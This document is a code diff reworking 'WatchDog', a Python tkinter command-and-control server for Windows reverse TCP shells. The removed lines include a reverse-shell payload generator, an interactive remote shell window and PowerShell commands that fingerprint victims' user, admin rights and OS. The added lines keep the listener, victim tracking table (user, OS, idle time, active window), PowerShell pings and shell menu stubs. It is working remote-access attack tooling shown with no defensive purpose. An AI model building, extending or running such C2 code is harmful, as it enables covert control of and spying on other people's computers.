@@ -1,285 +1,387 @@
-import os
+import tkinter as tk
+from tkinter import ttk
+from tkinter import messagebox
+
+
 import time
 import socket
 import threading
-import tkinter as tk
-from tkinter import ttk, scrolledtext, messagebox
+from datetime import datetime
+            
 
-class WatchDogGUI(tk.Tk):
-    def __init__(self):
-        super().__init__()
-        self.title("WatchDog C2 Server")
-        self.geometry("800x500")
+
+class WatchDogGUI:
+    def __init__(self, root):
+        self.root = root
+
+        self.Version = "0.1.0"
+        self.root.title(f"WatchDog GUI {self.Version}")
+        self.root.geometry("900x480")
+
+
         self.running = True
-        self.WatchDog_Version = "0.1.0"
-        
+        self.isListening = False
+
+        self.socket_timeout_Server = 5
+        self.socket_timeout_clients = 5
+
+        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.s.settimeout(self.socket_timeout_Server)
+
+        lo = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        lo.connect(("8.8.8.8", 80))
+
+        self.IP = lo.getsockname()[0]
+        self.PORT = 5050
+
         self.data_clients = []
-        self.current_client = None
-        self.server_ip = "127.0.0.1"  # Default value
-        
-        # Initialize network first
-        self.setup_network()
-        self.create_widgets()
-        
-        threading.Thread(target=self.test_connections, daemon=True).start()
 
-    def setup_network(self):
-        try:
-            self.s_f = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            self.s_f.connect(("8.8.8.8", 80))
-            self.server_ip = self.s_f.getsockname()[0]
-        except Exception as e:
-            messagebox.showwarning("Network Warning", 
-                f"Could not detect external IP: {str(e)}\nUsing localhost")
-            self.server_ip = "127.0.0.1"
-        
-        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.server_socket.settimeout(2)
 
-    def create_widgets(self):
-        notebook = ttk.Notebook(self)
-        notebook.pack(expand=True, fill='both')
-        
-        # Generate Tab
-        generate_frame = ttk.Frame(notebook)
-        self.create_generate_tab(generate_frame)
-        notebook.add(generate_frame, text="Generate")
-        
-        # Server Tab
-        server_frame = ttk.Frame(notebook)
-        self.create_server_tab(server_frame)
-        notebook.add(server_frame, text="Server")
-        
-        # Sessions Tab
-        sessions_frame = ttk.Frame(notebook)
-        self.create_sessions_tab(sessions_frame)
-        notebook.add(sessions_frame, text="Sessions")
-        
-        # Log Tab
-        log_frame = ttk.Frame(notebook)
-        self.create_log_tab(log_frame)
-        notebook.add(log_frame, text="Logs")
+        self.IP_Entry = tk.StringVar()
 
-    def create_generate_tab(self, parent):
-        ttk.Label(parent, text="Payload Type:").grid(row=0, column=0, padx=5, pady=5)
-        self.payload_type = ttk.Combobox(parent, values=[
-            "windows/powershell/reverse_tcp",
-            "windows/batch/reverse_tcp",
-            "windows/exe/reverse_tcp"
-        ])
-        self.payload_type.grid(row=0, column=1, padx=5, pady=5)
         
-        ttk.Label(parent, text="LHOST:").grid(row=1, column=0, padx=5, pady=5)
-        self.lhost = ttk.Entry(parent)
-        self.lhost.insert(0, self.server_ip)
-        self.lhost.grid(row=1, column=1, padx=5, pady=5)
-        
-        ttk.Label(parent, text="LPORT:").grid(row=2, column=0, padx=5, pady=5)
-        self.lport = ttk.Entry(parent)
-        self.lport.insert(0, "5050")
-        self.lport.grid(row=2, column=1, padx=5, pady=5)
-        
-        generate_btn = ttk.Button(parent, text="Generate Payload", command=self.generate_payload)
-        generate_btn.grid(row=3, column=0, columnspan=2, pady=10)
+        # Create main notebook (tabs container)
+        self.notebook = ttk.Notebook(root)
+        self.notebook.pack(fill='both', expand=True)
 
-    def create_server_tab(self, parent):
-        ttk.Label(parent, text="RHOST:").grid(row=0, column=0, padx=5, pady=5)
-        self.rhost = ttk.Entry(parent)
-        self.rhost.insert(0, self.server_ip)
-        self.rhost.grid(row=0, column=1, padx=5, pady=5)
-        
-        ttk.Label(parent, text="RPORT:").grid(row=1, column=0, padx=5, pady=5)
-        self.rport = ttk.Entry(parent)
-        self.rport.insert(0, "5050")
-        self.rport.grid(row=1, column=1, padx=5, pady=5)
-        
-        self.server_status = ttk.Label(parent, text="Server Status: Stopped", foreground='red')
-        self.server_status.grid(row=2, column=0, columnspan=2, pady=5)
-        
-        self.start_btn = ttk.Button(parent, text="Start Server", command=self.toggle_server)
-        self.start_btn.grid(row=3, column=0, columnspan=2, pady=10)
+        # Create tabs
+        self.create_connections_tab()
+        self.create_local_settings_tab()
+        self.create_agent_builder_tab()
+        self.create_event_log_tab()
+        self.create_about_tab()
 
-    def create_sessions_tab(self, parent):
-        self.sessions_list = ttk.Treeview(parent, columns=('IP', 'User', 'Admin', 'OS'), show='headings')
-        self.sessions_list.heading('IP', text='IP Address')
-        self.sessions_list.heading('User', text='Username')
-        self.sessions_list.heading('Admin', text='Admin')
-        self.sessions_list.heading('OS', text='Operating System')
-        self.sessions_list.pack(expand=True, fill='both', padx=5, pady=5)
-        
-        btn_frame = ttk.Frame(parent)
-        btn_frame.pack(pady=5)
-        
-        ttk.Button(btn_frame, text="Refresh", command=self.update_sessions).pack(side=tk.LEFT, padx=5)
-        ttk.Button(btn_frame, text="Interact", command=self.open_shell).pack(side=tk.LEFT, padx=5)
-        ttk.Button(btn_frame, text="Disconnect", command=self.disconnect_client).pack(side=tk.LEFT, padx=5)
+        # Create status bar
+        self.status_bar = tk.Label(root, text="Listening: False", bd=1, relief=tk.SUNKEN, anchor=tk.W)
+        self.status_bar.pack(side=tk.BOTTOM, fill=tk.X)
 
-    def create_log_tab(self, parent):
-        self.log_area = scrolledtext.ScrolledText(parent, wrap=tk.WORD)
-        self.log_area.pack(expand=True, fill='both', padx=5, pady=5)
 
-    def generate_payload(self):
-        payload = self.payload_type.get()
-        lhost = self.lhost.get()
-        lport = self.lport.get()
-        
-        if not all([payload, lhost, lport]):
-            messagebox.showerror("Error", "All fields are required!")
-            return
-        
-        os.system(f"python {payload}.py {lhost} {lport}")
-        self.log(f"Payload generated: {payload} {lhost}:{lport}")
+        threading.Thread(target=self.ListeningForClients).start()
+        threading.Thread(target=self.PingEveryClients).start()
 
-    def toggle_server(self):
-        if self.start_btn.cget('text') == 'Start Server':
-            self.start_server()
-        else:
-            self.stop_server()
-            
-    def start_server(self):
-        try:
-            self.server_socket.bind((self.rhost.get(), int(self.rport.get())))
-            self.server_socket.listen()
-            self.server_status.config(text="Server Status: Running", foreground='green')
-            self.start_btn.config(text="Stop Server")
-            threading.Thread(target=self.listen_for_connections, daemon=True).start()
-            self.log("Server started successfully")
-        except Exception as e:
-            messagebox.showerror("Error", f"Failed to start server: {str(e)}")
-            
-    def stop_server(self):
-        self.running = False
-        self.server_socket.close()
-        self.server_status.config(text="Server Status: Stopped", foreground='red')
-        self.start_btn.config(text="Start Server")
-        self.log("Server stopped")
-        
-    def listen_for_connections(self):
-        while self.running:
-            try:
-                conn, addr = self.server_socket.accept()
-                self.handle_new_connection(conn, addr)
-            except socket.timeout:
-                continue
-            except OSError:
-                break
-            
-    def handle_new_connection(self, conn, addr):
-        user = self.cmd_WhoAmI(conn)
-        admin = self.cmd_Check_Privileges(conn)
-        os_info = self.cmd_OS_name(conn)
-        
-        self.data_clients.append({
-            'conn': conn,
-            'addr': addr,
-            'user': user,
-            'admin': admin,
-            'os': os_info,
-            'active': True
-        })
-        
-        self.log(f"New connection from {addr[0]}: {user}@{os_info} (Admin: {admin})")
-        self.update_sessions()
+    def create_connections_tab(self):
+        tab = ttk.Frame(self.notebook)
+        self.notebook.add(tab, text="Connections")
 
-    def update_sessions(self):
-        self.sessions_list.delete(*self.sessions_list.get_children())
-        for client in self.data_clients:
-            self.sessions_list.insert('', 'end', values=(
-                client['addr'][0],
-                client['user'],
-                client['admin'],
-                client['os']
+        # Create treeview
+        columns = ("location", "assigned_name", "computer_user", "os", "uptime", "idle_time", "active_window")
+        self.tree = ttk.Treeview(tab, columns=columns, show='headings')
+
+        # Define headings
+        self.tree.heading("location",      text="Location")
+        self.tree.heading("assigned_name", text="Assigned Name")
+        self.tree.heading("computer_user", text="Computer/User")
+        self.tree.heading("os",            text="Operation System")
+        self.tree.heading("uptime",        text="System Uptime")
+        self.tree.heading("idle_time",     text="Idle time")
+        self.tree.heading("active_window", text="Active Window")
+
+        # Set column widths
+        self.tree.column("location",      width=120)
+        self.tree.column("assigned_name", width=120)
+        self.tree.column("computer_user", width=150)
+        self.tree.column("os",            width=150)
+        self.tree.column("uptime",        width=70)
+        self.tree.column("idle_time",     width=70)
+        self.tree.column("active_window", width=180)
+
+        # Add sample data (replace with real data)
+        """self.tree.insert('', tk.END, values=(
+            "192.168.1.100",
+            "Client-01",
+            "DESKTOP-ABC123/User1",
+            "Windows 10 Pro 64-bit",
+            "2 hours",
+            "00:01:23",
+            "Google Chrome"
+        ))"""
+
+
+        """
+        # Add more sample entries
+        for i in range(2, 6):
+            self.tree.insert('', tk.END, values=(
+                f"192.168.1.10{i}:6565",
+                f"Client-0{i}",
+                f"DESKTOP-DEF45{i}/User{i}",
+                "Windows 11 Pro 64-bit",
+                f"{i} days {i}:3{i}:12",
+                f"00:0{i}:23",
+                "Microsoft Word"
             ))
-            
-    def open_shell(self):
-        selected = self.sessions_list.selection()
-        if not selected:
-            return
-            
-        item = self.sessions_list.item(selected[0])
-        client = next((c for c in self.data_clients if c['addr'][0] == item['values'][0]), None)
+        """
+
+        self.tree.pack(fill='both', expand=True)
+
+        # Add context menu
+        self.context_menu = tk.Menu(self.root, tearoff=0)
+        self.context_menu.add_command(label="shell1")
+        self.context_menu.add_command(label="shell2")
+        self.context_menu.add_command(label="shell3")
+        self.context_menu.add_command(label="shell4")
+        self.context_menu.add_command(label="shell5")
+        self.context_menu.add_command(label="Host Info")
+        self.context_menu.add_command(label="Disconnect", command=self.on_disconnect)
+        self.tree.bind("<Button-3>", self.show_context_menu)
+
+    def create_local_settings_tab(self):
+        tab = ttk.Frame(self.notebook)
+        self.notebook.add(tab, text="Local Settings")
+        # Add local settings content here
+        #label = ttk.Label(tab, text="Local Settings Configuration")
+        #label.pack(pady=20)
+
+        # self.start_btn = ttk.Button(control_frame, text="Start Server", command=self.start_server)
+        # self.start_btn.pack(side=tk.LEFT, padx=5)
+        # self.stop_btn = ttk.Button(control_frame, text="Stop Server", command=self.stop_server, state=tk.DISABLED)
+        # self.stop_btn.pack(side=tk.LEFT, padx=5)
+
+        tp_text = ttk.Label(tab, text="IP:")
+        tp_text.place(x=5, y=20)
+        ip = ttk.Entry(tab)
+        ip.place(x=45, y=20)
+        ip.insert(0, self.IP)
+
+        port_text = ttk.Label(tab, text="PORT:")
+        port_text.place(x=5, y=50)
+        port = ttk.Entry(tab)
+        port.place(x=45, y=50)
+        port.insert(0, str(self.PORT))
+
+        self.start_server_button = ttk.Button(tab, text="Start Server", command=self.StartUpServer)
+        self.start_server_button.place(x=5, y=80)
+
+        self.stop_server_button = ttk.Button(tab, text="Stop Server", command=self.StopServer, state=tk.DISABLED) 
+        self.stop_server_button.place(x=5, y=110)
+
+    def create_about_tab(self):
+        tab = ttk.Frame(self.notebook)
+        self.notebook.add(tab, text="About")
+        # Add about content here
+        label = ttk.Label(tab, text=f"WatchDog GUI\nVersion {self.Version}\n\n(c) 2025 WatchDog")
+        label.pack(pady=20)
+        about_text = """
+        Features:
+            - Reverse TCP Connections
+            - Multi-Client Management
+            - Real-time Monitoring
+            - Cross-platform Support
+        """
+        ttk.Label(tab, text=about_text, justify=tk.LEFT).pack(pady=20, padx=20)
+
+    def create_agent_builder_tab(self):
+        tab = ttk.Frame(self.notebook)
+        self.notebook.add(tab, text="Agent Builder")
+        # Add agent builder content here
+        label = ttk.Label(tab, text="Agent Builder Configuration")
+        label.pack(pady=20)
+
+    def create_event_log_tab(self):
+        tab = ttk.Frame(self.notebook)
+        self.notebook.add(tab, text="Event Log")
+        # Add event log content here
+        self.log_text = tk.Text(tab, wrap=tk.WORD)
+        scrollbar = ttk.Scrollbar(tab, orient="vertical", command=self.log_text.yview)
+        self.log_text.configure(yscrollcommand=scrollbar.set)
         
-        if client:
-            self.current_client = client
-            self.create_shell_window(client)
-            
-    def create_shell_window(self, client):
-        shell_win = tk.Toplevel(self)
-        shell_win.title(f"Shell - {client['user']}@{client['addr'][0]}")
+        self.log_text.pack(side="left", fill="both", expand=True)
+        scrollbar.pack(side="right", fill="y")
+
+        # self.log_text.insert(tk.END, "[2024-03-20 14:30:45] Server started\n")
+        # self.log_text.insert(tk.END, "[2024-03-20 14:31:12] Client connected: 192.168.1.100\n")
+        # self.log_text.insert(tk.END, "[2024-03-20 14:32:01] Command executed: screenshot\n")
+
+        # self.log_text.config(state=tk.DISABLED)
+
+    def show_context_menu(self, event):
+        item = self.tree.identify_row(event.y)
+        if item:
+            self.tree.selection_set(item)
+            self.context_menu.post(event.x_root, event.y_root)
+
+    def on_disconnect(self):
+        selected_items = self.tree.selection()
+        if selected_items:
+            item_id = selected_items[0]
+            index = self.tree.index(item_id)
+            self.tree.delete(item_id)
+
+            self.AddLogs(f"Manually disconnected client {self.data_clients[index][1]}, Row {index}")
+            self.SendMessage(index, "; exit")
+            self.data_clients.pop(index)
+
+        """
+        selected_item = self.tree.selection()
+        if selected_item:
+            self.tree.delete(selected_item)
+            index = self.tree.index(selected_item)
+            self.AddLogs(f"Manuel disconnect client {selected_item}, Row {index}")
+        """
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    def GetDataAndTime(self):
+        now = datetime.now()
+        return now.strftime("[%Y-%m-%d %H:%M:%S]")
+    
+    def AddLogs(self, text):
+        print(f"{self.GetDataAndTime()} {text}")
+        self.log_text.insert(tk.END, f"{self.GetDataAndTime()} {text}\n")
+
+
+    def StartUpServer(self):
+        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.s.settimeout(2)
+
+        self.s.bind((self.IP, self.PORT))
+        self.s.listen()
+        self.AddLogs(f"Start Server: {self.IP}:{self.PORT}")
+
+        self.isListening = True
+
+        self.status_bar.config(text=f'Listening: {self.IP}')
+
+        self.start_server_button.config(state=tk.DISABLED)
+        self.stop_server_button.config(state=tk.NORMAL)
+
+    def StopServer(self):
+        self.s.close()
+        self.AddLogs("Stop Server")
+        self.isListening = False
+
+        self.status_bar.config(text=f'Listening: False')
+
+        self.stop_server_button.config(state=tk.DISABLED)
+        self.start_server_button.config(state=tk.NORMAL)
+
+        for pp in self.data_clients:
+            pp[0].close()
+            self.data_clients.remove(pp)
         
-        output = scrolledtext.ScrolledText(shell_win, wrap=tk.WORD)
-        output.pack(expand=True, fill='both', padx=5, pady=5)
-        
-        input_frame = ttk.Frame(shell_win)
-        input_frame.pack(fill=tk.X, padx=5, pady=5)
-        
-        cmd_entry = ttk.Entry(input_frame)
-        cmd_entry.pack(side=tk.LEFT, expand=True, fill=tk.X)
-        
-        def send_command():
-            cmd = cmd_entry.get()
-            if not cmd:
-                return
-                
-            try:
-                client['conn'].send(bytes(cmd, "utf-8"))
-                output.insert(tk.END, f"> {cmd}\n")
-                response = client['conn'].recv(4096).decode("utf-8")
-                output.insert(tk.END, f"{response}\n")
-            except Exception as e:
-                output.insert(tk.END, f"Error: {str(e)}\n")
-                
-            cmd_entry.delete(0, tk.END)
-            
-        ttk.Button(input_frame, text="Send", command=send_command).pack(side=tk.LEFT, padx=5)
-        
-    def disconnect_client(self):
-        selected = self.sessions_list.selection()
-        if not selected:
-            return
-            
-        item = self.sessions_list.item(selected[0])
-        client = next((c for c in self.data_clients if c['addr'][0] == item['values'][0]), None)
-        
-        if client:
-            client['conn'].close()
-            self.data_clients.remove(client)
-            self.update_sessions()
-            self.log(f"Disconnected client: {item['values'][0]}")
-            
-    def test_connections(self):
+        for item in self.tree.get_children():
+            self.tree.delete(item)
+            self.AddLogs(f"disconnect client {item}")
+
+
+    def ListeningForClients(self):
         while self.running:
-            time.sleep(10)
-            for client in self.data_clients.copy():
-                if not self.cmd_test_connection(client['conn']):
-                    self.data_clients.remove(client)
-                    self.log(f"Client disconnected: {client['addr'][0]}")
-                    self.update_sessions()
-                    
-    def log(self, message):
-        self.log_area.insert(tk.END, f"[{time.strftime('%H:%M:%S')}] {message}\n")
-        self.log_area.see(tk.END)
-        
-    def cmd_test_connection(self, conn):
+            if self.isListening:
+                try:
+                    try:
+                        conn, addr = self.s.accept()
+                        conn.settimeout(self.socket_timeout_clients)  # 2 seconds timeout
+                        self.data_clients.append([conn, addr[0]])
+                        # print(f"Client Connect: {[conn, addr[0]]}")
+                        self.AddLogs(f"Client Connect: {addr[0]} PORT: {addr[1]}")
+
+                        """self.tree.insert('', tk.END, values=(
+                            addr[0],
+                            "Client-01",
+                            "DESKTOP-ABC123/User1",
+                            "Windows 10 Pro 64-bit",
+                            "2 hours",
+                            "00:01:23",
+                            "Google Chrome"
+                        ))"""
+
+                    except socket.timeout:
+                        pass
+                except:
+                    pass
+            else:
+                time.sleep(2)
+
+    
+
+    def sync_tree_with_list(self):
+        tree_items = self.tree.get_children()
+        tree_names = [self.tree.item(item, "values")[0] for item in tree_items]
+
+        # Add missing names from list to Treeview
+        for name in self.data_clients:
+            if name[1] not in tree_names:
+                self.tree.insert('', tk.END, values=(
+                            name[1],
+                            "Client-01",
+                            "DESKTOP-ABC123/User1",
+                            "Windows 10 Pro 64-bit",
+                            "2 hours",
+                            "00:01:23",
+                            "Google Chrome"
+                        ))
+                # print(f"Added: {name}")
+
+        # Remove names from Treeview that aren't in the list
+        client_names = [name[1] for name in self.data_clients]
+
+        # Remove names from Treeview that aren't in self.data_clients
+        for item_id in tree_items:
+            name_in_tree = self.tree.item(item_id, "values")[0]
+            if name_in_tree not in client_names:
+                self.tree.delete(item_id)
+                # print(f"Removed: {name_in_tree}")
+
+
+    
+    def PingEveryClients(self):
+        ping_time = time.time()
+
+        while self.running:
+            if self.isListening:
+
+                if (time.time() - ping_time) > 10:
+                    ping_time = time.time()
+                    print("ping")
+
+                    for i in range(len(self.data_clients)):
+                        if not self.cmd_test_connection(i):
+                            self.AddLogs(f"Client Lost connect: {self.data_clients[i][1]}")
+                            self.data_clients.pop(i)
+
+                self.sync_tree_with_list()
+
+
+            time.sleep(2)
+
+    
+    def SendMessage(self, index, message):
+        self.data_clients[index][0].send(bytes(message, "utf-8"))
+
+    
+    def GetMessage(self, index, messagesize):
+        return self.data_clients[index][0].recv(messagesize).decode("utf-8")
+
+
+    def cmd_test_connection(self, index):
         try:
-            conn.send(bytes("Write-Output '   '", "utf-8"))
-            conn.recv(64).decode("utf-8")
-            return True
+            try:
+                self.data_clients[index][0].send(bytes("Write-Output 'ping'", "utf-8"))
+                self.data_clients[index][0].recv(64).decode("utf-8")
+                return 1
+            except socket.timeout:
+                return 0
         except:
-            return False
-            
-    def cmd_WhoAmI(self, conn):
-        conn.send(bytes("whoami", "utf-8"))
-        return conn.recv(64).decode("utf-8")[:-2]
-        
-    def cmd_Check_Privileges(self, conn):
-        conn.send(bytes("([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)", "utf-8"))
-        return conn.recv(16).decode("utf-8")[:-2]
-        
-    def cmd_OS_name(self, conn):
-        conn.send(bytes("$osInfo = Get-CimInstance Win32_OperatingSystem; $osInfo.Caption", "utf-8"))
-        return conn.recv(32).decode("utf-8")[:-2]
+            return 0
 
 if __name__ == "__main__":
-    app = WatchDogGUI()
-    app.mainloop()
+    root = tk.Tk()
+    app = WatchDogGUI(root)
+    root.mainloop()
+    exit()
